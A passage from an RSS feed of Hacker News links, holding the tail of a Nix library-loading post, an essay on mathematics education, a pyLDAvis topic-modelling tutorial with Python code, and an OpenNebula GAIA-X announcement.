<p>We can use <a href="https://github.com/bennofs/nix-index">nix-index</a> – a files database for nixpkgs – to locate packages in Nix that provide the necessary library. 🤯</p>

<p>The packages can be realized on-demand onto the host and their <em>/nix/store</em> entry can then be included into the <em>LD_LIBRARY_PATH</em> environment variable set when handing off to the <em>real ld</em>.</p>

<blockquote>
  <p>If gc-roots are set for the required libraries, this determination can then be cached for a given binary.</p>
</blockquote>

<p>Fancier best-effort matching on picking packages that have the highest % of required symbols could also be done.</p>

<p>It seems kind of crazy that just picking random packages from the <em>nix-index</em> would ultimately let us run the binary; except that is how traditional software in Linux normally works! 😱</p>

<p>At worst it is providing the same experience users typically experience on non-NixOS distributions but giving a gentler onboarding for people as they see the Nix-light 😇</p>


<hr>
    </article></div>]]>
            </description>
            <link>https://fzakaria.com/2020/11/17/on-demand-linked-libraries-for-nix.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25150572</guid>
            <pubDate>Thu, 19 Nov 2020 15:39:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Unreasonable Ineffectiveness of Mathematics Education (2012)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25150503">thread link</a>) | @dredmorbius
<br/>
November 19, 2020 | https://www.refsmmat.com/posts/2012-10-19-unreasonable-math.html | <a href="https://web.archive.org/web/*/https://www.refsmmat.com/posts/2012-10-19-unreasonable-math.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
<header>
  
  
  <span><a href="https://www.refsmmat.com/blog.html">the refsmmat report</a> · a blog at <a rel="me" href="https://www.refsmmat.com/">refsmmat.com</a></span>
</header>

<p><em>Revised October 23 based on comments on <a href="https://news.ycombinator.com/item?id=4679539">Hacker News</a> and <a href="http://www.reddit.com/r/math/comments/11sw82/the_unreasonable_ineffectiveness_of_mathematics/">Reddit</a>.</em></p>
<p>In American schools, mathematics is taught as a dark art. Learn these sacred methods and you will become master of the ancient symbols. You must memorize the techniques to our satisfaction or your performance on the state standardized exams will be so poor that they will be forced to lower the passing grades. Never mind the foundational principles, proofs, or derivations – you’ll learn those in due course.</p>
<p>Why? Why do math? Because you’ll <em>need</em> it, that’s why. You’ll use it in your physics classes. And I’m sure I can think of examples of how you’ll use math in “real life”, whatever your chosen career may be. Right? Right. I hear engineers have to know how to solve differential equations, for example, and before you can do differential equations you need to learn logarithms. So get back to chapter 14 and get working.</p>
<p>This is the message we’re giving our children, and it’s no wonder so few students develop an interest in mathematics. Ask any math major: Math isn’t about memorizing some formulas and learning how to factor polynomials. It’s… well, it’s something much deeper. It’s fascinating. But what is it exactly?</p>
<section id="rules-rules-rules">

<p>The universe appears to work on rules. Gravity tends to pull us to the Earth in the same way every day. Light has behaved exactly the same way for millions of years. Objects in motion tend to stay in motion unless acted upon by an external force. Magnets and electricity obey the same laws now as they did in the 1860s, when Maxwell discovered the laws.</p>
<p>Much of the human world obeys rules as well. Interest and fees accumulate in bank accounts according to rules set down in extremely small font on pieces of paper immediately discarded by account-holders. Internet traffic piles up in buffers and gets routed to its destination according to complicated sets of standards. Engine control modules execute millions of lines of code to read sensor data and process the driver’s instructions to keep pistons flailing in low-emissions synchrony. Aircraft autopilots use clever mathematical algorithms to decide how to keep long metal tubes with wings from falling out of the sky.</p>
<p>I could go on, but you get the idea. Many things follow predictable sets of rules. How can we precisely express these rules in a useful way?</p>
<p>We could use English (or Spanish, or whatever chosen language), but languages are notoriously ambiguous and tricky to work with. It would take many pages to precisely describe Maxwell’s equations of electrodynamics in English, and more importantly, the result would be impossible to work with.</p>
<p>After all, once the rules are set down you’d like to put them to use: make predictions about the behavior of reality, invent new devices, or calculate how many more boxes of ramen noodles you can afford before your paycheck arrives.</p>
<p>How do I move from <em>general</em> rules about the world to <em>specific</em> rules that describe what will happen in one particular situation? With rules written in English, I’m limited to one method:<a href="#fn1" id="fnref1"><sup>1</sup></a></p>
<ol type="1">
<li>Write down the rules and the situation.</li>
<li>Think very hard.</li>
<li>Write down the answer.</li>
</ol>
<p>There’s no system by which I manipulate a rule written in English and arrive at new facts about a specific situation. If I gave you a Monopoly rulebook, could you deduce the best properties to invest in, based on the expected likelihood of a player landing on each property? (If you must resort to written mathematics, you have proved my point.)</p>
<p>Rules aren’t useful if we can’t use them. Fortunately, we have mathematics.</p>
</section>
<section id="math-is-just-a-bunch-of-lego-bricks">

<p>Forget the mathematics you learned in school. Let’s think of mathematics in the abstract. Mathematics, at its most basic, is a very simple set of very well-defined rules. The rules describe the behavior and interaction of certain completely imaginary objects. Upon these rules, mathematicians have built others. By combining rules, mathematicians demonstrate certain facts about these imaginary objects: when certain objects are arranged in certain ways, the rules show they must have certain properties.</p>
<p>On top of all these rules mathematicians have built a universe. Inhabiting this universe are various objects – tensors, matrices, groups, Hilbert spaces, ordinary numbers, complex numbers, and so on and so forth – which are defined by mathematicians by the sets of rules they follow. Many of these rules are in fact defined in terms of combinations of much simpler rules. If a mathematician wishes to know how a certain mathematical object behaves under certain circumstances, he must simply apply the simple rules in creative ways to discover what <em>must</em> be true.</p>
<p>It’s much like being handed an extraordinarily large and complex Lego brick creation and figuring out what it does and how it works. Lego bricks are exceedingly simple, and you understand exactly how they work. The ungainly creation you’ve been given is made of Lego bricks, so you must simply take what you know about individual bricks and work out what happens when they’re put together. Soon enough you sort out what the stubby-looking bit on the left side does, and you no longer have to worry about the individual bricks: you just know that it’s a frobnulator, and now you understand how frobnulators work. Eventually, with much work, you can deduce what the entire machine does, and write down a set of rules describing its behavior. You can forget about the individual bricks and worry only about the entire creation.</p>
<p>Objects of mathematical construction are much the same, although they are much less painful to step on.<a href="#fn2" id="fnref2"><sup>2</sup></a></p>
</section>
<section id="glued-legos">

<p>High school mathematics doesn’t focus on the very basic rules and constructions of mathematics; they are very abstract, rigorously defined, and difficult to connect to physical reality. Our curriculum instead focuses on certain constructions that relate to reality. Geometry, for instance, is based on a very basic set of rules, but allows us to prove facts about real objects in three-dimensional space. A clever mathematician can wield the rules and basic facts to learn about all sorts of complicated shapes without ever leaving the two-dimensional world of a sheet of paper.</p>
<p>But that skill is not taught in high school. School mathematics is about memorizing the constructed mathematical objects, not learning how to wield the simple rules to build new objects and dissect their behavior.</p>
<p>High school mathematics, then, is much like being given a set of Lego airplanes which have been carefully glued together. You may learn how they work, but you do not have the tools to disassemble them and you haven’t the faintest idea how to build a new one. Should you ever meet these airplanes again, your knowledge will be useful; otherwise, what’s the point? It’s just like an 8th-grader complaining that he’ll never use the quadratic equation again in his life.</p>
<p>But what can you do with the basic rules of mathematics? Why do we care?</p>
<p>We’ve already discussed how many familiar parts of reality appear to follow rules. For many, like electromagnetism, we have no idea how the universe “knows” to follow these rules or why it must use these rules and not some other set. But we <em>can</em> construct complicated mathematical objects that in some ways are exactly analogous to physical objects. We can construct a mathematical object which represents an electric field, specify the rules it operates by, and use the rules to sort out what happens when a mathematical object representing an electron wanders by.</p>
<p>Or we could devise mathematical rules to represent the wobbling behavior of a plate spun and thrown in the air.<a href="#fn3" id="fnref3"><sup>3</sup></a></p>
<p>Or we could devise rules describing the grip of a car tire on a road surface in different atmospheric conditions.</p>
<p>Or rules describing how furniture can be arranged in the available space of your living room.</p>
<p>Or rules describing your retirement plan.</p>
<p>Or rules describing… well, anything you can think of that seems to follow rules. Perhaps mathematicians haven’t yet devised mathematical objects that behave in the right ways, or perhaps they have but do not understand how to manipulate them. Perhaps you can write down a set of rules but it’s so horribly complicated that it would take a computer years to determine what will happen ten seconds after you flip a switch. But the rules exist, and mathematics, one way or another, can probably describe them.</p>
<p>Some justify mathematics education as a way to teach students to think critically; that’s good, but they could also analyze essays and literature or study logic for that. We should not teach our students so they can be human calculators and perform simple arithmetic; that is important, but it is hardly the most useful part of mathematics.</p>
<p>We should teach our students mathematics because they can use it to describe reality. They can use it to discover facts about the universe. Facts about their retirement funds, their living rooms, and the rate of fish food consumption in their fish tanks.</p>
<p>Mathematics is a tool to explore reality. We should teach our students to use it.</p>
</section>
<section>
<hr>
<ol>
<li id="fn1"><p>This method is also known as the Feynman Problem-Solving Algorithm, but it only works if you are Richard Feynman.<a href="#fnref1">↩</a></p></li>
<li id="fn2"><p>Though I once sprained an ankle stepping on a perturbed Hamiltonian.<a href="#fnref2">↩</a></p></li>
<li id="fn3"><p>Where by “we” I really mean <a href="http://www.physics.ohio-state.edu/~kilcup/262/feynman.html">Richard Feynman</a>.<a href="#fnref3">↩</a></p></li>
</ol>
</section>




</div>]]>
            </description>
            <link>https://www.refsmmat.com/posts/2012-10-19-unreasonable-math.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25150503</guid>
            <pubDate>Thu, 19 Nov 2020 15:32:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[PyLDAvis: Topic Modelling Exploration Tool Every NLP Data Scientist Should Know]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25150399">thread link</a>) | @patrycjaneptune
<br/>
November 19, 2020 | https://neptune.ai/blog/pyldavis-topic-modelling-exploration-tool-that-every-nlp-data-scientist-should-know | <a href="https://web.archive.org/web/*/https://neptune.ai/blog/pyldavis-topic-modelling-exploration-tool-that-every-nlp-data-scientist-should-know">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <article class="page">
	
<p>Have you ever wanted to classify news, papers, or tweets based on their topics? Knowing how to do this can help you filter out irrelevant documents, and save time by reading only what you’re interested in.</p>



<p>That’s what text classification is for – allows you to train your model to recognize topics. This technique allows you to use data labels to train your model, and it’s supervised learning.</p>



<div><figure><img loading="lazy" width="461" height="200" src="https://i2.wp.com/neptune.ai/wp-content/uploads/text-classification.png?resize=461%2C200&amp;ssl=1" alt="text classification" srcset="https://i2.wp.com/neptune.ai/wp-content/uploads/text-classification.png?w=461&amp;ssl=1 461w, https://i2.wp.com/neptune.ai/wp-content/uploads/text-classification.png?resize=300%2C130&amp;ssl=1 300w" sizes="(max-width: 461px) 100vw, 461px" data-recalc-dims="1"></figure></div>



<p>In real life, you might not have data labels for text classification. You can go through each document to label them, or hire somebody else to do it, but that’s a lot of time and money, especially when you have more than 1000 data points.</p>



<p>Can you find the topics of your documents without training data? Yes, you can use topic modeling to do it.</p>






<h2>What is topic modeling?</h2>



<p>With <a href="https://towardsdatascience.com/end-to-end-topic-modeling-in-python-latent-dirichlet-allocation-lda-35ce4ed6b3e0" target="_blank" rel="noreferrer noopener nofollow">topic modeling</a>, you can cluster words for a set of documents. This is unsupervised learning, because it automatically groups words without a predefined list of labels.</p>



<p>If you feed the model data, it will give you different sets of words, and each set of words describes the topic.</p>



<pre>(<span>0</span>, <span>'0.024*</span><span>"ban"</span> + <span>0.017</span>*<span>"order"</span> + <span>0.015</span>*<span>"refugee"</span> + <span>0.015</span>*<span>"law"</span> + <span>0.013</span>*<span>"trump"</span> '
 <span>'+</span> <span>0.011</span>*<span>"kill"</span> + <span>0.011</span>*<span>"country"</span> + <span>0.010</span>*<span>"attack"</span> + <span>0.009</span>*<span>"state"</span> + '
 <span>'0.009*</span><span>"immigration"</span>')
(<span>1</span>, <span>'0.020*</span><span>"student"</span> + <span>0.020</span>*<span>"work"</span> + <span>0.019</span>*<span>"great"</span> + <span>0.017</span>*<span>"learn"</span> + '
  <span>'0.017*</span><span>"school"</span> + <span>0.015</span>*<span>"talk"</span> + <span>0.014</span>*<span>"support"</span> + <span>0.012</span>*<span>"community"</span> + '
  <span>'0.010*</span><span>"share"</span> + <span>0.009</span>*<span>"event"</span>)</pre>



<p>When you look at the first set of words, you would guess the topic is military and politics.&nbsp;Looking at the second set of words, you might guess the topic is public events, or school.</p>



<p>This is quite useful. Your texts are automatically categorized, without the need to label them!</p>






<h2>Visualize topic modeling with pyLDAvis</h2>



<p>Topic modeling is useful, but it’s difficult to understand it just by looking at a combination of words and numbers like above.</p>



<p>One of the most effective ways to understand data is through visualization. Is there a way that we can visualize the results of LDA? Yes, we can with<a href="https://github.com/bmabey/pyLDAvis" target="_blank" rel="noreferrer noopener nofollow"> pyLDAvis</a>.</p>



<p>PyLDAvis allows us to interpret the topics in a topic model like below:</p>



<div><figure><img loading="lazy" width="1024" height="620" src="https://i0.wp.com/neptune.ai/wp-content/uploads/PyLDAvis.gif?resize=1024%2C620&amp;ssl=1" alt="PyLDAvis " srcset="https://i0.wp.com/neptune.ai/wp-content/uploads/PyLDAvis.gif?resize=1024%2C620&amp;ssl=1 1024w, https://i0.wp.com/neptune.ai/wp-content/uploads/PyLDAvis.gif?resize=300%2C182&amp;ssl=1 300w, https://i0.wp.com/neptune.ai/wp-content/uploads/PyLDAvis.gif?resize=768%2C465&amp;ssl=1 768w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></figure></div>



<p>Pretty cool, isn’t it? <strong>Now we will learn how to use topic modeling and pyLDAvis to categorize tweets and visualize the results. We’ll analyze </strong><a href="https://datapane.com/u/khuyentran1401/reports/tweets/" target="_blank" rel="noreferrer noopener nofollow"><strong>a real Twitter dataset containing 6000 tweets.</strong></a>&nbsp;</p>



<p>Let’s see what topics we can find.</p>



<figure></figure>






<h2>How to start with pyLDAvis and how to use it</h2>



<p>Install pyLDAvis with:</p>



<pre>pip install pyldavis</pre>



<p>The script to process the data can be found <a href="https://ui.neptune.ai/khuyentran1401/sandbox/n/ac75203d-2de0-4bbf-a559-ec7763d919d8/e7960ea4-c002-4ea6-949f-8964c1e33491" target="_blank" rel="noreferrer noopener nofollow">here</a>. Download the <a href="https://datapane.com/u/khuyentran1401/reports/processed_tweets/" target="_blank" rel="noreferrer noopener nofollow">data after being processed</a>.</p>



<p>Moving on, let’s import relevant libraries:</p>



<pre><span>import</span> gensim
<span>import</span> gensim.corpora <span>as</span> corpora
<span>from</span> gensim.corpora <span>import</span> Dictionary
<span>from</span> gensim.models.coherencemodel <span>import</span> CoherenceModel
<span>from</span> gensim.models.ldamodel <span>import</span> LdaModel

<span>from</span> pprint <span>import</span> pprint

<span>import</span> spacy

<span>import</span> pickle
<span>import</span> re 
<span>import</span> pyLDAvis
<span>import</span> pyLDAvis.gensim

<span>import</span> matplotlib.pyplot <span>as</span> plt 
<span>import</span> pandas <span>as</span> pd</pre>



<p>If you want to get access to the data above and follow along with the article, download the data and put the data in your current directory, then run:</p>



<pre>tweets = pd.read_csv(<span>'dp-export-8940.csv'</span>) 
tweets = tweets.Tweets.values.tolist()


tweets = [t.split(<span>','</span>) <span>for</span> t <span>in</span> tweets]</pre>






<h2>How to use LDA Model</h2>



<p>Topic modeling involves counting words and grouping similar word patterns to describe topics within the data. If the model knows the word frequency, and which words often appear in the same document, it will discover patterns that can group different words together.</p>



<p>We start with converting a collection of words to a bag of words, which is a list of tuples (word_id, word_frequency). <strong>gensim.corpora.Dictionary</strong> is a great tool for this:</p>



<pre>id2word = Dictionary(tweets)

corpus = [id2word.doc2bow(text) <span>for</span> text <span>in</span> tweets]
print(corpus[:<span>1</span>])

[[(<span>0</span>, <span>1</span>), (<span>1</span>, <span>1</span>), (<span>2</span>, <span>1</span>), (<span>3</span>, <span>3</span>), (<span>4</span>, <span>1</span>), (<span>5</span>, <span>2</span>), (<span>6</span>, <span>2</span>), (<span>7</span>, <span>1</span>), (<span>8</span>, <span>1</span>), (<span>9</span>, <span>1</span>), (<span>10</span>, <span>1</span>), (<span>11</span>, <span>2</span>), (<span>12</span>, <span>2</span>), (<span>13</span>, <span>1</span>), (<span>14</span>, <span>1</span>), (<span>15</span>, <span>1</span>), (<span>16</span>, <span>2</span>), (<span>17</span>, <span>1</span>), (<span>18</span>, <span>1</span>), (<span>19</span>, <span>1</span>), (<span>20</span>, <span>2</span>), (<span>21</span>, <span>1</span>), (<span>22</span>, <span>1</span>), (<span>23</span>, <span>1</span>), (<span>24</span>, <span>1</span>), (<span>25</span>, <span>2</span>), (<span>26</span>, <span>1</span>), (<span>27</span>, <span>1</span>), (<span>28</span>, <span>1</span>), (<span>29</span>, <span>1</span>), (<span>30</span>, <span>1</span>), (<span>31</span>, <span>1</span>), (<span>32</span>, <span>1</span>), ... , (<span>347</span>, <span>1</span>), (<span>348</span>, <span>1</span>), (<span>349</span>, <span>2</span>), (<span>350</span>, <span>1</span>), (<span>351</span>, <span>1</span>), (<span>352</span>, <span>1</span>), (<span>353</span>, <span>1</span>), (<span>354</span>, <span>1</span>), (<span>355</span>, <span>1</span>), (<span>356</span>, <span>1</span>), (<span>357</span>, <span>1</span>), (<span>358</span>, <span>1</span>), (<span>359</span>, <span>1</span>), (<span>360</span>, <span>1</span>), (<span>361</span>, <span>1</span>), (<span>362</span>, <span>2</span>), (<span>363</span>, <span>1</span>), (<span>364</span>, <span>4</span>), (<span>365</span>, <span>1</span>), (<span>366</span>, <span>1</span>), (<span>367</span>, <span>3</span>), (<span>368</span>, <span>1</span>), (<span>369</span>, <span>8</span>), (<span>370</span>, <span>1</span>), (<span>371</span>, <span>1</span>), (<span>372</span>, <span>1</span>), (<span>373</span>, <span>4</span>)]]</pre>



<p>What do these tuples mean? Let’s convert them into human readable format to understand:</p>



<pre>[[(id2word[i], freq) <span>for</span> i, freq <span>in</span> doc] <span>for</span> doc <span>in</span> corpus[:<span>1</span>]]

[[(<span>"'d"</span>, <span>1</span>),
  (<span>'-'</span>, <span>1</span>),
  (<span>'absolutely'</span>, <span>1</span>),
  (<span>'aca'</span>, <span>3</span>),
  (<span>'act'</span>, <span>1</span>),
  (<span>'action'</span>, <span>2</span>),
  (<span>'add'</span>, <span>2</span>),
  (<span>'administrative'</span>, <span>1</span>),
  (<span>'affordable'</span>, <span>1</span>),
  (<span>'allow'</span>, <span>1</span>),
  (<span>'amazing'</span>, <span>1</span>),
...
  (<span>'way'</span>, <span>4</span>),
  (<span>'week'</span>, <span>1</span>),
  (<span>'well'</span>, <span>1</span>),
  (<span>'will'</span>, <span>3</span>),
  (<span>'wonder'</span>, <span>1</span>),
  (<span>'work'</span>, <span>8</span>),
  (<span>'world'</span>, <span>1</span>),
  (<span>'writing'</span>, <span>1</span>),
  (<span>'wrong'</span>, <span>1</span>),
  (<span>'year'</span>, <span>4</span>)]]</pre>



<p>Now let’s build an LDA topic model. We will use <a href="https://radimrehurek.com/gensim/models/ldamodel.html#gensim.models.ldamodel.LdaModel" target="_blank" rel="noreferrer noopener nofollow">gensim.models.ldamodel.LdaModel</a> for this:</p>



<pre>
lda_model = LdaModel(corpus=corpus,
                   id2word=id2word,
                   num_topics=<span>10</span>, 
                   random_state=<span>0</span>,
                   chunksize=<span>100</span>,
                   alpha=<span>'auto'</span>,
                   per_word_topics=<span>True</span>)

pprint(lda_model.print_topics())
doc_lda = lda_model[corpus]
</pre>



<p>There seem to be some <strong>patterns</strong> here. The first topic may be politics, and the second topic may be sport, but the pattern is not clear.</p>



<pre>[(<span>0</span>,
 <span>'0.017*"go" + 0.013*"think" + 0.013*"know" + 0.010*"time" + 0.010*"people" + '</span>
 <span>'0.008*"good" + 0.008*"thing" + 0.007*"feel" + 0.007*"need" + 0.007*"get"'</span>),
(<span>1</span>,
 <span>'0.020*"game" + 0.019*"play" + 0.019*"good" + 0.013*"win" + 0.012*"go" + '</span>
 <span>'0.010*"look" + 0.010*"great" + 0.010*"team" + 0.010*"time" + 0.009*"year"'</span>),
(<span>2</span>,
 <span>'0.029*"video" + 0.026*"new" + 0.021*"like" + 0.020*"day" + 0.019*"today" + '</span>
 <span>'0.015*"check" + 0.014*"photo" + 0.009*"post" + 0.009*"morning" + '</span>
 <span>'0.009*"year"'</span>),
(<span>3</span>,
 <span>'0.186*"more" + 0.058*"today" + 0.021*"pisce" + 0.016*"capricorn" + '</span>
 <span>'0.015*"cancer" + 0.015*"aquarius" + 0.013*"arie" + 0.008*"feel" + '</span>
 <span>'0.008*"gemini" + 0.006*"idea"'</span>),
(<span>4</span>,
 <span>'0.017*"great" + 0.011*"new" + 0.010*"thank" + 0.010*"work" + 0.008*"good" + '</span>
 <span>'0.008*"look" + 0.007*"how" + 0.006*"learn" + 0.005*"need" + 0.005*"year"'</span>),
(<span>5</span>,
 <span>'0.028*"thank" + 0.026*"love" + 0.017*"good" + 0.013*"day" + 0.010*"year" + '</span>
 <span>'0.010*"look" + 0.010*"happy" + 0.010*"great" + 0.010*"time" + 0.009*"go"'</span>)]
</pre>



<p>Let’s use pyLDAvis to visualize the topics:</p>



<div><figure><img loading="lazy" width="1024" height="620" src="https://i2.wp.com/neptune.ai/wp-content/uploads/PyLDAvis-visualization.gif?resize=1024%2C620&amp;ssl=1" alt="PyLDAvis visualization" srcset="https://i2.wp.com/neptune.ai/wp-content/uploads/PyLDAvis-visualization.gif?resize=1024%2C620&amp;ssl=1 1024w, https://i2.wp.com/neptune.ai/wp-content/uploads/PyLDAvis-visualization.gif?resize=300%2C182&amp;ssl=1 300w, https://i2.wp.com/neptune.ai/wp-content/uploads/PyLDAvis-visualization.gif?resize=768%2C465&amp;ssl=1 768w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></figure></div>



<p>Click <a href="https://ui.neptune.ai/khuyentran1401/sandbox/n/Topic-modeling-b25db361-8995-42ee-bd50-6f03fa8d5847/65d94d91-43e9-4c21-bee6-8a9bf7584087#ldavis_el55571398076541038884947444595" target="_blank" rel="noreferrer noopener nofollow">here</a> to interact with the visualization yourself.</p>



<ul><li>Each bubble represents a topic. The larger the bubble, the higher percentage of the number of tweets in the corpus is about that topic.</li><li>Blue bars represent the overall frequency of each word in the corpus. If no topic is selected, the blue bars of the most frequently used words will be displayed.</li><li>Red bars give the estimated number of times a given term was generated by a given topic. As you can see from the image below, there are about 22,000 of the word ‘go’, and this term is used about 10,000 times within topic 1. The word with the longest red bar is the word that is used the most by the tweets belonging to that topic.</li></ul>



<div><figure><img loading="lazy" src="https://i0.wp.com/neptune.ai/wp-content/uploads/pyLDAvis-visualization.png?resize=596%2C648&amp;ssl=1" alt="PyLDAvis visualization" width="596" height="648" srcset="https://i0.wp.com/neptune.ai/wp-content/uploads/pyLDAvis-visualization.png?w=794&amp;ssl=1 794w, https://i0.wp.com/neptune.ai/wp-content/uploads/pyLDAvis-visualization.png?resize=276%2C300&amp;ssl=1 276w, https://i0.wp.com/neptune.ai/wp-content/uploads/pyLDAvis-visualization.png?resize=768%2C836&amp;ssl=1 768w" sizes="(max-width: 596px) 100vw, 596px" data-recalc-dims="1"></figure></div>



<ul><li>The further the bubbles are away from each other, the more different they are. For example, it is difficult to tell the difference between topics 1 and 2. They seem to be both about social life, but it is much easier to tell the difference between topics 1 and 3. We can tell that topic 3 is about politics.</li></ul>



<div><figure><img loading="lazy" width="613" height="651" src="https://i0.wp.com/neptune.ai/wp-content/uploads/pyLDAvis-visualization-2.png?resize=613%2C651&amp;ssl=1" alt="pyLDAvis visualization" srcset="https://i0.wp.com/neptune.ai/wp-content/uploads/pyLDAvis-visualization-2.png?w=613&amp;ssl=1 613w, https://i0.wp.com/neptune.ai/wp-content/uploads/pyLDAvis-visualization-2.png?resize=282%2C300&amp;ssl=1 282w" sizes="(max-width: 613px) 100vw, 613px" data-recalc-dims="1"></figure></div>



<p>A good topic model will have big and non-overlapping bubbles scattered throughout the chart. As we can see from the graph, the bubbles are clustered within one place. Can we do better than this?</p>



<p>Yes, because luckily, there is a better model for topic modeling called LDA Mallet.</p>






<h2>How to use LDA Mallet Model</h2>



<p>Our model will be better if the words in a topic are similar, so we will use topic coherence to evaluate our model. Topic coherence evaluates a single topic by measuring the degree of semantic similarity between high scoring words in the topic. <strong>A good model will generate topics with high topic coherence scores.</strong></p>



<pre>
coherence_model_lda = CoherenceModel(model=lda_model, texts=tweets, dictionary=id2word, coherence=<span>'c_v'</span>)
coherence_lda = coherence_model_lda.get_coherence()
print(<span>'\\nCoherence Score: '</span>, coherence_lda)

Coherence Score:  <span>0.3536443343685833</span>
</pre>



<p>This is our baseline. We have just used Gensim’s inbuilt version of the <a href="https://diging.github.io/tethne/api/tutorial.mallet.html" target="_blank" rel="noreferrer noopener nofollow">LDA algorithm</a>,&nbsp;but there is an LDA model that provides better quality of topics called the <a href="https://medium.com/swlh/topic-modeling-lda-mallet-implementation-in-python-part-2-602ffb38d396"><strong>LDA Mallet Model</strong></a>.</p>



<p><strong>Let’s see if we can do better with LDA Mallet.&nbsp;</strong></p>



<pre>mallet_path = <span>'patt/to/mallet-2.0.8/bin/mallet'</span> 
ldamallet = gensim.models.wrappers.LdaMallet(mallet_path, corpus=corpus, num_topics=<span>20</span>, id2word=id2word)


pprint(ldamallet.show_topics(formatted=<span>False</span>))


coherence_model_ldamallet = CoherenceModel(model=ldamallet, texts=tweets, dictionary=id2word, coherence=<span>'c_v'</span>)
coherence_ldamallet = coherence_model_ldamallet.get_coherence()
print(<span>'\\nCoherence Score: '</span>, coherence_ldamallet)

Coherence Score:  <span>0.38780981858635866</span></pre>



<p><strong>The coherence score is better! </strong>Can the score be better if we increase or decrease the number of topics? Let’s find it out by fine-tuning the model. <a href="https://www.machinelearningplus.com/nlp/topic-modeling-gensim-python/#16buildingldamalletmodel" target="_blank" rel="noreferrer noopener nofollow">This tutorial</a> provides an excellent explanation of how to tune the LDA model. Below is the source code from the article:</p>



<pre><span><span>def</span> <span>compute_coherence_values</span><span>(dictionary, corpus, texts, limit, start=<span>2</span>, step=<span>3</span>)</span>:</span>
    <span>"""
    Compute c_v coherence for various number of topics

    Parameters:
    ----------
    dictionary : Gensim dictionary
    corpus : Gensim corpus
    texts : List of input texts
    limit : Max num of topics

    Returns:
    -------
    model_list : List of LDA topic models
    coherence_values : Coherence values corresponding to the LDA model with respective number of topics
    """</span>
    coherence_values = []
    model_list = []
    <span>for</span> num_topics <span>in</span> range(start, limit, step):
        model = …</pre></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://neptune.ai/blog/pyldavis-topic-modelling-exploration-tool-that-every-nlp-data-scientist-should-know">https://neptune.ai/blog/pyldavis-topic-modelling-exploration-tool-that-every-nlp-data-scientist-should-know</a></em></p>]]>
            </description>
            <link>https://neptune.ai/blog/pyldavis-topic-modelling-exploration-tool-that-every-nlp-data-scientist-should-know</link>
            <guid isPermaLink="false">hacker-news-small-sites-25150399</guid>
            <pubDate>Thu, 19 Nov 2020 15:24:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[OpenNebula joins GAIA-X as Day-1 Member]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25150302">thread link</a>) | @amarti
<br/>
November 19, 2020 | https://opennebula.io/opennebula-joins-gaia-x/ | <a href="https://web.archive.org/web/*/https://opennebula.io/opennebula-joins-gaia-x/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
			    <!-- .entry-header -->

				
					
<article id="post-28679">

    <!-- .entry-header -->

    <div>

		
<p>Back in June we already announced that <strong>OpenNebula</strong>, as part of its <a rel="noreferrer noopener" href="https://oneedge.io/" target="_blank">ONEedge</a> initiative—the EU-funded project to build the first open source Edge Computing platform in Europe—was <a href="https://opennebula.io/opennebula-contributes-to-gaia-x/">contributing to GAIA-X</a> with its expertise in distributed and federated cloud environments, hyperconverged cloud infrastructures, complex storage and virtual networking architectures, management and automation tools for large cloud deployments, and <strong>edge computing</strong>.</p>



<p>We are now delighted to confirm that <strong>OpenNebula Systems</strong> has joined this pan-European project as a <strong>Day-1 Member of the GAIA-X AISBL</strong> (in incorporation), the international non-profit association that is going to provide a formal structure to this initiative, coordinating the efforts of the GAIA-X Community, promoting international cooperation, and developing the necessary regulatory frameworks and rules to ensure the interoperability and reliability of the providers, services and data sources made available through GAIA-X. This announcement has taken place during the <a rel="noreferrer noopener" href="https://events.talque.com/gaia-x-summit/en/6iq6yI5LPSxaIRA6cmnq" target="_blank">GAIA-X Summit</a> (Nov 18-19, 2020), an event that marks an important milestone for the project! 🚀</p>



<figure><video controls="" src="https://opennebula.io/wp-content/uploads/2020/11/GaiaX_Intro.mp4"></video></figure>



<p>🇪🇺 The <a rel="noreferrer noopener" href="https://www.data-infrastructure.eu/" target="_blank">GAIA-X project</a> supports the goals of the <a rel="noreferrer noopener" href="https://ec.europa.eu/info/strategy/priorities-2019-2024/europe-fit-digital-age/european-data-strategy_en" target="_blank">European data strategy</a>, which emphasizes the economic and social opportunities of data as well as European values and laws (e.g. GDPR). The common goal of the organizations joining the project is to create GAIA-X as a basis for a sovereign, European data infrastructure, which provides interoperability between different data creating and processing entities via federated services. One of our main tasks will be to make sure that <strong>OpenNebula</strong> Cloud Service Providers and Corporate Users can get the most out of the GAIA-X federated cloud infrastructure and of the resources that will be made available through this new <strong>European virtual hyperscaler</strong>.</p>



<div><p>The <strong>OpenNebula Webinar on GAIA-X</strong> that took place on September 8, 2020 is available on demand: <a href="https://opennebula.io/webinars">https://opennebula.io/webinars</a> Many thanks to our amazing guest speakers, <strong>Andreas Weiss</strong> (Director of EuroCloud Germany) and <strong>Mirko Lampe</strong> (Coordinator of GAIA-X Workstream 2—Technical Implementation).</p><p>We have created a <strong>GAIA-X Working Group</strong> within the OpenNebula Community, so <strong>Cloud Service Providers and Corporate Users</strong> interested in GAIA-X, or planning to join this initiative, please let us know by sending an email to <a href="https://opennebula.org/contact/">community@opennebula.io</a> 📡</p></div>
		
		


        <div>
            <p><img alt="" src="https://secure.gravatar.com/avatar/7bc2911f4ae58287da05140e43efc2f6?s=96&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/7bc2911f4ae58287da05140e43efc2f6?s=192&amp;d=mm&amp;r=g 2x" height="96" width="96">            </p>
            <div>
                <p><span id="autorblog">Alberto P. Martí</span></p><p>Open Source Community Manager at OpenNebula</p>
            </div>
        </div>
	</div><!-- .entry-content -->

